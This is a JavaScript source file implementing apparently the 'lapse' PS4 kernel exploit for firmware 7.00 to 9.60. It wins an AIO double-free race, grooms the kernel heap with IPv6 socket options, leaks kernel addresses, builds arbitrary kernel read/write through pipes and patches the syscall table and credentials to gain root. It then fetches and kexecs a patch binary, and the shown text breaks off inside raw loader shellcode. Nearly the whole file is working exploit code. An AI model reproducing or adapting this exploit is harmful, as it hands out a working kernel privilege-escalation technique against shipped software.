import { Int } from "./module/int64.mjs";
import { mem } from "./module/mem.mjs";
import { log, die, hex, hexdump } from "./module/utils.mjs";
import { cstr, jstr } from "./module/memtools.mjs";
import { page_size, context_size } from "./module/offset.mjs";
import { Chain } from "./module/chain.mjs";
import { View1, View2, View4, Word, Long, Pointer, Buffer } from "./module/view.mjs";
import * as rop from "./module/chain.mjs";
import * as config from "./config.mjs";

// static imports for firmware configurations
import * as fw_ps4_700 from "./lapse/ps4/700.mjs";
import * as fw_ps4_750 from "./lapse/ps4/750.mjs";
import * as fw_ps4_751 from "./lapse/ps4/751.mjs";
import * as fw_ps4_800 from "./lapse/ps4/800.mjs";
import * as fw_ps4_850 from "./lapse/ps4/850.mjs";
import * as fw_ps4_852 from "./lapse/ps4/852.mjs";
import * as fw_ps4_900 from "./lapse/ps4/900.mjs";
import * as fw_ps4_903 from "./lapse/ps4/903.mjs";
import * as fw_ps4_950 from "./lapse/ps4/950.mjs";

const t1 = performance.now();

// Firmware payload mapping
const payloadMap = {
  700: "ps4-hen-700-vtx.bin",
  750: "ps4-hen-750-vtx.bin",
  751: "ps4-hen-751-vtx.bin",
  800: "ps4-hen-800-vtx.bin",
  803: "ps4-hen-803-vtx.bin",
  850: "ps4-hen-850-vtx.bin",
  852: "ps4-hen-852-vtx.bin",
  900: "goldhen.bin",
  903: "goldhen.bin",
  904: "ps4-hen-904-vtx.bin",
  950: "ps4-hen-950-vtx.bin",
  960: "goldhen.bin",
};

// Check firmware version
const { is_ps4, version } = (() => {
  const value = config.target;
  const is_ps4 = !(value & 0x10000);
  const version = value & 0xffff;
  const [min, max] = is_ps4 ? [0x100, 0x1250] : [0x100, 0x1020];

  if (version < min || version >= max) {
    throw new RangeError(`Invalid firmware: ${hex(value)}`);
  }

  log(`Console: PS${is_ps4 ? "4" : "5"} | Firmware: ${hex(version)}`);
  return { is_ps4, version };
})();

// Get payload file for firmware version
const getPayloadFile = (version) => payloadMap[version] || die(`No payload for firmware: ${hex(version)}`);

const fw_config = (() => {
  if (!is_ps4) throw new RangeError("PS5 unsupported");
  const fw_map = {
    700: fw_ps4_700,
    750: fw_ps4_750,
    751: fw_ps4_751,
    800: fw_ps4_800,
    850: fw_ps4_850,
    852: fw_ps4_852,
    900: fw_ps4_900,
    903: fw_ps4_903,
    950: fw_ps4_950,
  };
  for (const [min, cfg] of Object.entries(fw_map)) {
    const nextMin = Object.keys(fw_map).find(k => k > min) || 0x1000;
    if (version >= parseInt(min) && version < parseInt(nextMin)) {
      return cfg;
    }
  }
  die(`Unsupported firmware: ${hex(version)}`);
})();

const { pthread_offsets, off_kstr, off_cpuid_to_pcpu, off_sysent_661, jmp_rsi, patch_elf_loc } = fw_config;

// Socket constants
const AF_INET = 2, AF_INET6 = 28, AF_UNIX = 1, SOCK_STREAM = 1, SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff, SO_REUSEADDR = 4, SO_LINGER = 0x80;
const IPPROTO_TCP = 6, IPPROTO_UDP = 17, IPPROTO_IPV6 = 41;
const TCP_INFO = 0x20, size_tcp_info = 0xec, TCPS_ESTABLISHED = 4;
const IPV6_2292PKTOPTIONS = 25, IPV6_PKTINFO = 46, IPV6_NEXTHOP = 48, IPV6_RTHDR = 51, IPV6_TCLASS = 61;

// System constants
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const PROT_READ = 1, PROT_WRITE = 2, PROT_EXEC = 4, MAP_SHARED = 1, MAP_FIXED = 0x10;
const RTP_SET = 1, RTP_PRIO_REALTIME = 2;

// AIO constants
const AIO_CMD_READ = 1, AIO_CMD_WRITE = 2, AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_STATE_COMPLETE = 3, AIO_STATE_ABORTED = 4;
const num_workers = 2, max_aio_ids = 0x80;

// Exploit constants
const main_core = 7, num_grooms = 0x200, num_handles = 0x100, num_sds = 0x100;
const num_alias = 10, num_races = 100, leak_len = 16, num_leaks = 5, num_clobbers = 8;
const rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);

let chain, nogc = [];

async function init() {
  await rop.init();
  chain = new Chain();
  rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
}

// System call wrappers
const sys_void = (...args) => chain.syscall_void(...args);
const sysi = (...args) => chain.sysi(...args);
const call_nze = (...args) => {
  const res = chain.call_int(...args);
  if (res !== 0) die(`Call(${args[0]}) failed: ${res}`);
};

// AIO operations
const _aio_errors = new View4(max_aio_ids);
const aio_submit_cmd = (cmd, reqs, num_reqs, handles) => sysi("aio_submit_cmd", cmd, reqs, num_reqs, 3, handles);
const aio_multi_op = (op, ids, num_ids, sce_errs = _aio_errors.addr) => sysi(op, ids, num_ids, sce_errs);
const aio_multi_delete = (...args) => aio_multi_op("aio_multi_delete", ...args);
const aio_multi_poll = (...args) => aio_multi_op("aio_multi_poll", ...args);
const aio_multi_cancel = (...args) => aio_multi_op("aio_multi_cancel", ...args);
const aio_multi_wait = (ids, num_ids) => sysi("aio_multi_wait", ids, num_ids, _aio_errors.addr, 1, 0);

const make_reqs1 = (num_reqs) => {
  const reqs = new Buffer(0x28 * num_reqs);
  for (let i = 0; i < num_reqs; i++) reqs.write32(0x20 + i * 0x28, -1);
  return reqs;
};

const spray_aio = (loops, reqs_p, num_reqs, ids_p, multi = true, cmd = AIO_CMD_READ) => {
  const step = 4 * (multi ? num_reqs : 1);
  cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
  for (let i = 0, idx = 0; i < loops; i++, idx += step) {
    aio_submit_cmd(cmd, reqs_p, num_reqs, ids_p.add(idx));
  }
};

const free_aios = (ids_p, num_ids, cancel = true) => {
  const len = max_aio_ids, rem = num_ids % len, num_batches = (num_ids - rem) / len;
  for (let bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    if (cancel) aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    if (cancel) aio_multi_cancel(addr, rem);
    aio_multi_poll(addr, rem);
    aio_multi_delete(addr, rem);
  }
};

// Socket operations
const new_socket = () => sysi("socket", AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
const new_tcp_socket = () => sysi("socket", AF_INET, SOCK_STREAM, 0);
const close = (fd) => sysi("close", fd);
const gsockopt = (sd, level, optname, optval, optlen) => {
  const size = new Word(optlen || optval.size);
  sysi("getsockopt", sd, level, optname, optval.addr, size.addr);
  return size[0];
};
const ssockopt = (sd, level, optname, optval, optlen = optval.size) => sysi("setsockopt", sd, level, optname, optval.addr, optlen);
const get_rthdr = (sd, buf, len) => gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
const set_rthdr = (sd, buf, len) => ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
const free_rthdrs = (sds) => sds.forEach(sd => ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0));

const build_rthdr = (buf, size) => {
  const len = ((size >> 3) - 1) & ~1;
  size = (len + 1) << 3;
  buf.write8(0, 0).write8(1, len).write8(2, 0).write8(3, len >> 1);
  return size;
};

// Thread operations
const get_our_affinity = (mask) => sysi("cpuset_getaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 8, mask.addr);
const set_our_affinity = (mask) => sysi("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 8, mask.addr);

const spawn_thread = (thread) => {
  const ctx = new Buffer(context_size);
  const pthread = new Pointer();
  pthread.ctx = ctx;
  ctx.write64(0x38, thread.stack_addr).write64(0x80, thread.get_gadget("ret"));
  call_nze("pthread_create", pthread.addr, 0, chain.get_gadget("setcontext"), ctx.addr);
  return pthread;
};

// Exploit stages
const make_aliased_rthdrs = (sds) => {
  const size = 0x80, buf = new Buffer(size), rsize = build_rthdr(buf, size);
  for (let loop = 0; loop < num_alias; loop++) {
    for (let i = 0; i < num_sds; i++) {
      buf.write32(4, i);
      set_rthdr(sds[i], buf, rsize);
    }
    for (let i = 0; i < sds.length; i++) {
      get_rthdr(sds[i], buf);
      const marker = buf.read32(4);
      if (marker !== i) {
        log(`Aliased rthdrs at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        sds.splice(marker, 1).splice(i, 1);
        free_rthdrs(sds);
        sds.push(new_socket(), new_socket());
        return pair;
      }
    }
  }
  die(`Failed to alias rthdrs, size: ${hex(size)}`);
};

const race_one = (request_addr, tcp_sd, barrier, racer, sds) => {
  const sce_errs = new View4([-1, -1]), thr_mask = new Word(1 << main_core);
  racer.push_syscall("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 8, thr_mask.addr)
    .push_syscall("rtprio_thread", RTP_SET, 0, rtprio.addr)
    .push_gadget("pop rax; ret").push_value(1).push_get_retval()
    .push_call("pthread_barrier_wait", barrier.addr)
    .push_syscall("aio_multi_delete", request_addr, 1, sce_errs.addr_at(1))
    .push_call("pthread_exit", 0);

  const pthr = spawn_thread(racer), thr_tid = pthr.read32(0);
  while (racer.retval_int === 0) sys_void("sched_yield");

  chain.push_call("pthread_barrier_wait", barrier.addr)
    .push_syscall("sched_yield")
    .push_syscall("thr_suspend_ucontext", thr_tid)
    .push_get_retval().push_get_errno().push_end().run().reset();

  if (chain.retval_int === -1) {
    call_nze("pthread_join", pthr, 0);
    return null;
  }

  try {
    const poll_err = new View4(1);
    aio_multi_poll(request_addr, 1, poll_err.addr);
    const info_buf = new View1(size_tcp_info), info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
    if (info_size !== size_tcp_info) die(`TCP info size mismatch: ${info_size}`);
    const tcp_state = info_buf[0];

    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    if (poll_err[0] !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
      aio_multi_delete(request_addr, 1, sce_errs.addr);
      log(`Race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
      if (sce_errs[0] !== sce_errs[1]) die("Bad race win");
      return make_aliased_rthdrs(sds);
    }
  } finally {
    sysi("thr_resume_ucontext", thr_tid);
    call_nze("pthread_join", pthr, 0);
  }
  return null;
};

const double_free_reqs2 = (sds) => {
  const server_addr = new Buffer(16).write8(1, AF_INET).write16(2, 0x9513).write32(4, 0x0100007f); // Port 5050, 127.0.0.1
  const racer = new Chain(), barrier = new Long();
  call_nze("pthread_barrier_init", barrier.addr, 0, 2);

  const num_reqs = 3, which_req = num_reqs - 1;
  const reqs1 = make_reqs1(num_reqs), aio_ids = new View4(num_reqs);
  const cmd = AIO_CMD_READ | AIO_CMD_FLAG_MULTI;

  const sd_listen = new_tcp_socket();
  ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, new Word(1));
  sysi("bind", sd_listen, server_addr.addr, server_addr.size);
  sysi("listen", sd_listen, 1);

  for (let i = 0; i < num_races; i++) {
    const sd_client = new_tcp_socket();
    sysi("connect", sd_client, server_addr.addr, server_addr.size);
    const sd_conn = sysi("accept", sd_listen, 0, 0);
    ssockopt(sd_client, SOL_SOCKET, SO_LINGER, View4.of(1, 1));
    reqs1.write32(0x20 + which_req * 0x28, sd_client);

    aio_submit_cmd(cmd, reqs1.addr, num_reqs, aio_ids.addr);
    aio_multi_cancel(aio_ids.addr, num_reqs);
    aio_multi_poll(aio_ids.addr, num_reqs);
    close(sd_client);

    const res = race_one(aio_ids.addr_at(which_req), sd_conn, barrier, racer, sds);
    racer.reset();
    aio_multi_delete(aio_ids.addr, num_reqs);
    close(sd_conn);

    if (res) {
      log(`Won race at attempt: ${i}`);
      close(sd_listen);
      call_nze("pthread_barrier_destroy", barrier.addr);
      return res;
    }
  }
  die("Failed AIO double free");
};

const new_evf = (flags) => sysi("evf_create", cstr("").addr, 0, flags);
const set_evf_flags = (id, flags) => { sysi("evf_clear", id, 0); sysi("evf_set", id, flags); };
const free_evf = (id) => sysi("evf_delete", id);

const verify_reqs2 = (buf, offset) => {
  if (buf.read32(offset) !== AIO_CMD_WRITE) return false;
  const heap_prefixes = [];
  for (let i = 0x10; i <= 0x20; i += 8) {
    if (buf.read16(offset + i + 6) !== 0xffff) return false;
    heap_prefixes.push(buf.read16(offset + i + 4));
  }
  const state = buf.read32(offset + 0x38);
  if (!(0 < state && state <= 4) || buf.read32(offset + 0x38 + 4) !== 0 || !buf.read64(offset + 0x40).eq(0)) return false;
  for (let i = 0x48; i <= 0x50; i += 8) {
    if (buf.read16(offset + i + 6) === 0xffff) {
      if (buf.read16(offset + i + 4) !== 0xffff) heap_prefixes.push(buf.read16(offset + i + 4));
    } else if (i === 0x50 || !buf.read64(offset + i).eq(0)) return false;
  }
  return heap_prefixes.every(e => e === heap_prefixes[0]);
};

const leak_kernel_addrs = (sd_pair) => {
  close(sd_pair[1]);
  const sd = sd_pair[0], buf = new Buffer(0x80 * leak_len);
  let evf = null;
  for (let i = 0; i < num_alias; i++) {
    const evfs = Array(num_handles).fill().map((_, i) => new_evf(0xf00 | (i << 16)));
    get_rthdr(sd, buf, 0x80);
    const flags32 = buf.read32(0);
    evf = evfs[flags32 >>> 16];
    set_evf_flags(evf, flags32 | 1);
    get_rthdr(sd, buf, 0x80);
    evfs.splice(flags32 >> 16, 1).forEach(free_evf);
    if (buf.read32(0) !== (flags32 | 1)) {
      evf = null;
      evfs.forEach(free_evf);
    }
    if (evf) {
      log(`Confused rthdr and evf at attempt: ${i}`);
      break;
    }
  }
  if (!evf) die("Failed to confuse evf and rthdr");

  set_evf_flags(evf, 0xff << 8);
  get_rthdr(sd, buf, 0x80);
  const kernel_addr = buf.read64(0x28), kbuf_addr = buf.read64(0x40).sub(0x38);
  log(`"evf cv" string addr: ${kernel_addr}, kernel buffer addr: ${kbuf_addr}`);

  const num_elems = 6, ucred = kbuf_addr.add(4), leak_reqs = make_reqs1(num_elems);
  leak_reqs.write64(0x10, ucred);
  const leak_ids = new View4(num_handles * num_elems), leak_ids_p = leak_ids.addr;

  let reqs2_off = null;
  for (let i = 0; i < num_leaks; i++) {
    get_rthdr(sd, buf);
    spray_aio(num_handles, leak_reqs.addr, num_elems, leak_ids_p, true, AIO_CMD_WRITE);
    get_rthdr(sd, buf);
    for (let off = 0x80; off < buf.length; off += 0x80) {
      if (verify_reqs2(buf, off)) {
        reqs2_off = off;
        log(`Found reqs2 at attempt: ${i}, offset: ${hex(reqs2_off)}`);
        break;
      }
    }
    if (reqs2_off) break;
    free_aios(leak_ids_p, leak_ids.length);
  }
  if (!reqs2_off) die("Could not leak reqs2");

  get_rthdr(sd, buf);
  const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
  let reqs1_addr = new Long(reqs2.read64(0x10)).lo &= -0x100;
  log(`reqs1_addr: ${reqs1_addr}`);

  let target_id = null, to_cancel_p, to_cancel_len;
  for (let i = 0; i < leak_ids.length; i += num_elems) {
    aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);
    get_rthdr(sd, buf);
    if (buf.read32(reqs2_off + 0x38) === AIO_STATE_ABORTED) {
      log(`Found target_id at batch: ${i / num_elems}`);
      target_id = new Word(leak_ids[i]);
      leak_ids[i] = 0;
      to_cancel_p = leak_ids.addr_at(i + num_elems);
      to_cancel_len = leak_ids.length - (i + num_elems);
      break;
    }
  }
  if (!target_id) die("Target_id not found");

  cancel_aios(to_cancel_p, to_cancel_len);
  free_aios(leak_ids_p, leak_ids.length, false);
  return [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf];
};

const make_aliased_pktopts = (sds) => {
  const tclass = new Word();
  for (let loop = 0; loop < num_alias; loop++) {
    sds.forEach(sd => ssockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0));
    sds.forEach((sd, i) => { tclass[0] = i; ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass); });
    for (let i = 0; i < sds.length; i++) {
      gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
      const marker = tclass[0];
      if (marker !== i) {
        log(`Aliased pktopts at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        sds.splice(marker, 1).splice(i, 1);
        sds.push(new_socket(), new_socket());
        return pair;
      }
    }
  }
  die("Failed to alias pktopts");
};

const double_free_reqs1 = (reqs1_addr, kbuf_addr, target_id, evf, sd, sds) => {
  const buf = new Buffer((0xff + 1) << 3), num_elems = max_aio_ids;
  const aio_reqs = make_reqs1(num_elems), aio_ids = new View4(num_elems * 2), aio_ids_p = aio_ids.addr;

  let aio_not_found = true;
  free_evf(evf);
  for (let i = 0; i < num_clobbers; i++) {
    spray_aio(2, aio_reqs.addr, num_elems, aio_ids_p);
    if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
      log(`Aliased at attempt: ${i}`);
      aio_not_found = false;
      cancel_aios(aio_ids_p, aio_ids.length);
      break;
    }
    free_aios(aio_ids_p, aio_ids.length);
  }
  if (aio_not_found) die("Failed to overwrite rthdr");

  const reqs2 = new Buffer(0x80), rsize = build_rthdr(reqs2, reqs2.size);
  reqs2.write32(4, 5).write64(0x18, reqs1_addr).write64(0x20, kbuf_addr.add(0x28))
    .write32(0x28, 1).write32(0x2c, 0).write32(0x30, AIO_STATE_COMPLETE)
    .write8(0x34, 0).write32(0x50, 0x67b0000).write64(0x60, 1);

  const states = new View4(num_elems), addr_cache = [aio_ids_p, aio_ids_p.add(num_elems << 2)];
  let req_id = null;
  close(sd); sd = null;
  for (let i = 0; i < num_alias; i++) {
    sds.forEach(sd => set_rthdr(sd, reqs2, rsize));
    for (let batch = 0; batch < addr_cache.length; batch++) {
      states.fill(-1);
      aio_multi_cancel(addr_cache[batch], num_elems, states.addr);
      const req_idx = states.indexOf(AIO_STATE_COMPLETE);
      if (req_idx !== -1) {
        log(`Found req_id at batch: ${batch}, idx: ${req_idx}`);
        const aio_idx = batch * num_elems + req_idx;
        req_id = new Word(aio_ids[aio_idx]);
        aio_ids[aio_idx] = 0;
        poll_aio(req_id, states);
        for (let j = 0; j < num_sds; j++) {
          const sd2 = sds[j];
          get_rthdr(sd2, reqs2);
          if (reqs2[0x34]) {
            sd = sd2;
            sds.splice(j, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
          }
        }
        if (!sd) die("Can't find sd that overwrote AIO queue entry");
        break;
      }
    }
    if (req_id) break;
  }
  if (!req_id) die("Failed to overwrite AIO queue entry");
  free_aios(aio_ids_p, aio_ids.length, false);

  const sce_errs = new View4([-1, -1]), target_ids = new View4([req_id, target_id]);
  aio_multi_delete(target_ids.addr, 2, sce_errs.addr);
  try {
    const sd_pair = make_aliased_pktopts(sds);
    return [sd_pair, sd];
  } finally {
    poll_aio(target_ids, states);
    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    if (states[0] !== SCE_KERNEL_ERROR_ESRCH || sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
      die("Double free on 0x100 malloc zone failed");
    }
  }
};

const make_kernel_arw = (pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) => {
  const psd = pktopts_sds[0], off_tclass = is_ps4 ? 0xb0 : 0xc0, tclass = new Word();
  const pktopts = new Buffer(0x100), rsize = build_rthdr(pktopts, pktopts.size);
  pktopts.write64(0x10, k100_addr.add(0x10));

  close(pktopts_sds[1]);
  let reclaim_sd = null;
  for (let i = 0; i < num_alias; i++) {
    sds.forEach((sd, j) => {
      pktopts.write32(off_tclass, 0x4141 | (j << 16));
      set_rthdr(sd, pktopts, rsize);
    });
    gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
    if ((tclass[0] & 0xffff) === 0x4141) {
      reclaim_sd = sds[tclass[0] >>> 16];
      sds.splice(tclass[0] >>> 16, 1);
      break;
    }
  }
  if (!reclaim_sd) die("Failed to overwrite main pktopts");

  const pktinfo = new Buffer(0x14), nhop = new Word(), read_buf = new Buffer(8);
  const kread64 = (addr) => {
    let offset = 0;
    while (offset < 8) {
      pktinfo.write64(8, addr.add(offset));
      nhop[0] = 8 - offset;
      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
      sysi("getsockopt", psd, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf.addr.add(offset), nhop.addr);
      offset += nhop[0] || 1;
    }
    return read_buf.read64(0);
  };

  if (jstr(read_buf.write64(0, kread64(kernel_addr))) !== "evf cv") die('Test read of &"evf cv" failed');
  const kbase = kernel_addr.sub(off_kstr);
  const pcpu = kread64(kbase.add(off_cpuid_to_pcpu + (7 - main_core) * 8));
  const td = kread64(pcpu), proc = kread64(td.add(8));
  if (kread64(proc.add(0xb0)).lo !== sysi("getpid")) die("Process not found");

  const p_fd = kread64(proc.add(0x48)), ofiles = kread64(p_fd), p_ucred = kread64(proc.add(0x40));
  const pipes = new View4(2);
  sysi("pipe", pipes.addr);
  const kpipe = kread64(kread64(ofiles.add(pipes[0] * 8)));
  const pipe_save = new Buffer(0x18);
  for (let off = 0; off < pipe_save.size; off += 8) pipe_save.write64(off, kread64(kpipe.add(off)));

  const main_sock = kread64(kread64(ofiles.add(psd * 8))), m_pktopts = kread64(kread64(main_sock.add(0x18)).add(0x118));
  if (m_pktopts.ne(k100_addr)) die("Main pktopts pointer mismatch");
  const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8))), r_pktopts = kread64(kread64(reclaim_sock.add(0x18)).add(0x118));
  const worker_sock = kread64(kread64(ofiles.add(dirty_sd * 8))), w_pktopts = kread64(kread64(worker_sock.add(0x18)).add(0x118));

  pktinfo.write64(0, w_pktopts.add(0x10)).write64(8, 0);
  ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  pktinfo.write64(0, kernel_addr);
  ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  if (jstr(pktinfo.write64(0, 0)) !== "evf cv") die("Pktopts read failed");

  class KernelMemory {
    constructor(main_sd, worker_sd, pipes, pipe_addr) {
      this.main_sd = main_sd;
      this.worker_sd = worker_sd;
      this.rpipe = pipes[0];
      this.wpipe = pipes[1];
      this.pipe_addr = pipe_addr;
      this.pipe_addr2 = pipe_addr.add(0x10);
      this.rw_buf = new Buffer(0x14);
      this.addr_buf = new Buffer(0x14);
      this.data_buf = new Buffer(0x14).write32(0xc, 0x40000000);
    }

    _verify_len(len) {
      if (!Number.isInteger(len) || len < 0 || len > 0xffffffff) throw TypeError("Invalid length");
    }

    copyin(src, dst, len) {
      this._verify_len(len);
      const { main_sd, worker_sd, addr_buf, data_buf, pipe_addr, pipe_addr2, wpipe } = this;
      addr_buf.write64(0, pipe_addr);
      ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write64(0, 0);
      ssockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, pipe_addr2);
      ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, dst);
      ssockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi("write", wpipe, src, len);
    }

    copyout(src, dst, len) {
      this._verify_len(len);
      const { main_sd, worker_sd, addr_buf, data_buf, pipe_addr, pipe_addr2, rpipe } = this;
      addr_buf.write64(0, pipe_addr);
      ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write32(0, 0x40000000);
      ssockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, pipe_addr2);
      ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, src);
      ssockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi("read", rpipe, dst, len);
    }

    read64(addr) {
      this.rw_buf.write64(0, addr).fill(0, 8);
      ssockopt(this.main_sd, IPPROTO_IPV6, IPV6_PKTINFO, this.rw_buf);
      gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, this.rw_buf);
      return this.rw_buf.read64(0);
    }

    write64(addr, value) {
      this.rw_buf.write64(0, value);
      this.copyin(this.rw_buf.addr, addr, 8);
    }
  }

  const kmem = new KernelMemory(psd, dirty_sd, pipes, kpipe);
  if (jstr(new Buffer(8).write64(0, kmem.read64(kernel_addr))) !== "evf cv") die("Pipe read failed");
  kmem.write64(r_pktopts.add(is_ps4 ? 0x68 : 0x70), 0);
  kmem.write64(w_pktopts.add(is_ps4 ? 0x68 : 0x70), 0);
  return [kbase, kmem, p_ucred, [kpipe, pipe_save, k100_addr.add(0x10), w_pktopts.add(0x10)]];
};

const get_binary = async (url) => {
  const res = await fetch(url);
  if (!res.ok) throw Error(`Failed to fetch ${url}: ${res.status}`);
  return res.arrayBuffer();
};

const patch_kernel = async (kbase, kmem, p_ucred, restore_info) => {
  if (!is_ps4 || version < 700 || version >= 0x1000) die("Kernel patching unsupported");
  const sysent_661 = kbase.add(off_sysent_661), sysent_save = new Buffer(0x30);
  for (let off = 0; off < sysent_save.size; off += 8) sysent_save.write64(off, kmem.read64(sysent_661.add(off)));
  kmem.write32(sysent_661, 6).write64(sysent_661.add(8), kbase.add(jmp_rsi)).write32(sysent_661.add(0x2c), 1);
  kmem.write64(p_ucred.add(0x60), -1).write64(p_ucred.add(0x68), -1);

  const buf = await get_binary(patch_elf_loc), patches = new View1(buf);
  let map_size = patches.size;
  if (map_size > 0x10000000) die(`Patch file too large: ${map_size}`);
  if (!map_size) die("Patch file empty");
  map_size = (map_size + page_size) & -page_size;

  const exec_fd = sysi("jitshm_create", 0, map_size, 7), write_fd = sysi("jitshm_alias", exec_fd, 3);
  const exec_p = new Int(0, 9), write_p = new Int(0x10000000, 9);
  const exec_addr = chain.sysp("mmap", exec_p, map_size, 5, MAP_SHARED | MAP_FIXED, exec_fd, 0);
  const write_addr = chain.sysp("mmap", write_p, map_size, 3, MAP_SHARED | MAP_FIXED, write_fd, 0);
  if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) die("JIT mmap failed");

  sysi("mlock", exec_addr, map_size);
  write_addr.write64(0, new Int(0x001337b8, 0xc300));
  sys_void("kexec", exec_addr);
  if (chain.errno !== 0x1337) die("JIT exec test failed");

  sysi("mlock", restore_info[1].addr, page_size);
  restore_info[4] = sysent_save.addr;
  sysi("mlock", restore_info[4], page_size);
  mem.cpy(write_addr, patches.addr, patches.size);
  sys_void("kexec", exec_addr, ...restore_info);
};

const setup = (block_fd) => {
  const reqs1 = new Buffer(0x28 * num_workers), block_id = new Word();
  for (let i = 0; i < num_workers; i++) reqs1.write32(8 + i * 0x28, 1).write32(0x20 + i * 0x28, block_fd);
  aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);

  const num_reqs = 3, groom_ids = new View4(num_grooms), greqs = make_reqs1(num_reqs);
  spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids.addr, false);
  cancel_aios(groom_ids.addr, num_grooms);
  return [block_id, groom_ids];
};

export async function kexploit() {
  const init_t1 = performance.now();
  await init();
  const init_t2 = performance.now();

  try {
    if (sysi("setuid", 0) == 0) {
      log("kernel already patched, skipping kexploit");
      return true;
    }
  } catch {
    // Expected when not in an exploited state
  }

  const main_mask = new Long();
  get_our_affinity(main_mask);
  set_our_affinity(new Long(1 << main_core));
  sysi("rtprio_thread", RTP_SET, 0, rtprio.addr);

  const unix_pair = new View4(2);
  sysi("socketpair", AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
  const [block_fd, unblock_fd] = unix_pair;
  const sds = Array(num_sds).fill().map(new_socket);

  let block_id, groom_ids;
  try {
    [block_id, groom_ids] = setup(block_fd);
    const sd_pair = double_free_reqs2(sds);
    const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair);
    const [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds);
    const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
    await patch_kernel(kbase, kmem, p_ucred, restore_info);
  } finally {
    close(unblock_fd);
    close(block_fd);
    if (groom_ids) free_aios(groom_ids.addr, groom_ids.length, false);
    if (block_id) {
      aio_multi_wait(block_id.addr, 1);
      aio_multi_delete(block_id.addr, 1);
    }
    sds.forEach(close);

    const t2 = performance.now();
    log(`Total time: ${(t2 - t1) / 1000}s, Init: ${(init_t2 - init_t1) / 1000}s, Exploit: ${(t2 - init_t2) / 1000}s`);
  }

  if (sysi("setuid", 0) === 0) {
    log("Kernel exploit succeeded!");
    return true;
  }
  die("Kernel exploit failed!");
}

const malloc32 = (sz) => {
  const backing = new Uint8Array(0x10000 + sz * 4);
  nogc.push(backing);
  const ptr = mem.readp(mem.addrof(backing).add(0x10));
  ptr.backing = new Uint32Array(backing.buffer);
  return ptr;
};

const array_from_address = (addr, size) => {
  const og_array = new Uint32Array(0x1000);
  const og_array_i = mem.addrof(og_array).add(0x10);
  mem.write64(og_array_i, addr).write32(og_array_i.add(8), size).write32(og_array_i.add(12), 1);
  nogc.push(og_array);
  return og_array;
};

const runBinLoader = () => {
  const payload_buffer = chain.sysp("mmap", 0, 0x300000, 7, 0x1000, 0xffffffff, 0);
  const payload_loader = malloc32(0x1000);
  const loader_writer = payload_loader.backing;
  const loader_code = [
    0x56415741, 0x83485541, 0x894818ec, 0xc748243c, 0x10082444, 0x483c2302, 0x102444c7, 0x00000000,
    0x000002bf, 0x0001be00, 0xd2310000, 0x00009ce8, 0xc7894100, 0x8d48c789, 0xba082474, 0x00000010,
